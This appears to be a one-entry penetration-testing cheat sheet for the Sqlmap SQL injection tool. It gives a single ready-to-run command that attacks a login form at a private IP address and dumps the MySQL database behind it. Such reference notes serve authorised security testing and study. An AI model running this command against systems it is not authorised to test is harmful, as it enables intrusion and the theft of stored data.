---
title: Sqlmap
desc: SQL injection automation tool.
tags: [ActiveRecon, Linux, SQLi]
alts: [Nmap]
---

```sh
# MySQL
sqlmap -u "http://10.0.0.1" --data="username=test&password=test" --dbms=mysql --dump
```